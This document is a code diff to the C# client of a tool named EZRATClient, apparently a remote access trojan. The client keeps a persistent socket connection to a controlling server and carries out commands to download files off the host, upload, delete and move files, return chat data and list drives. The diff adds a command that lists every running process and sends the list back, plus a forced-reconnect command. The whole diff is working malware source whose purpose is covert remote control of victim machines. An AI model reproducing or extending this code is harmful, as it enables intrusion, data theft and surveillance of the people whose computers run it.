@@ -11,6 +11,7 @@ using System.Threading;
 using System.Security.Cryptography;
 using EZRATClient.Utils;
 using EZRATClient.Forms;
+using System.Diagnostics;
 
 namespace EZRATClient
 {
@@ -181,8 +182,8 @@ namespace EZRATClient
 
             Console.WriteLine("Connection Ended"); //Disconnected at this point
             //Shutdown the client, then reconnect to the server
-            _clientSocket.Shutdown(SocketShutdown.Both);
-            _clientSocket.Close();
+            //_clientSocket.Shutdown(SocketShutdown.Both);
+            //_clientSocket.Close();
             _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             ConnectToServer();
             isDisconnect = false;
@@ -208,6 +209,7 @@ namespace EZRATClient
                 SendCommand(response);
 
             }
+            else if (text == "dc") { _clientSocket.Shutdown(SocketShutdown.Both); _clientSocket.Close(); ConnectToServer(); }
             else if (text == "lsdrives")
             {
                 string response = "lsdrives;";
@@ -280,19 +282,21 @@ namespace EZRATClient
                 }
 
 
-            } else if (text.StartsWith("chatdata;"))
+            }
+            else if (text.StartsWith("chatdata;"))
             {
                 if (cht != null)
                 {
-                    SendCommand("chatdata;" + String.Join("¦",cht.Texted));
+                    SendCommand("chatdata;" + String.Join("¦", cht.Texted));
                 }
             }
             else if (text.StartsWith("dlfile;"))
             {
                 string path = text.Substring(7);
                 SendFile(path);
-                
-            } else if(text.StartsWith("upfile;"))
+
+            }
+            else if (text.StartsWith("upfile;"))
             {
                 text = text.Substring(7);
                 string[] lines = text.Split(';');
@@ -304,13 +308,24 @@ namespace EZRATClient
             {
                 text = text.Substring(7);
                 File.Delete(text);
-            } else if(text.StartsWith("rmfile;"))
+            }
+            else if (text.StartsWith("rmfile;"))
             {
                 text = text.Substring(7);
                 string[] lines = text.Split(';');
                 string src = lines[0];
                 string dst = lines[1];
                 File.Move(src, dst);
+            }
+            else if (text.StartsWith("procview;"))
+            {
+                Process[] proc = Process.GetProcesses();
+                string result = "procview;";
+                for (int i = 0; i < proc.Length; i++)
+                {
+                    result += $"{proc[i].ProcessName}¦{proc[i].Id};";
+                }
+                SendCommand(result);
             }
         }
 
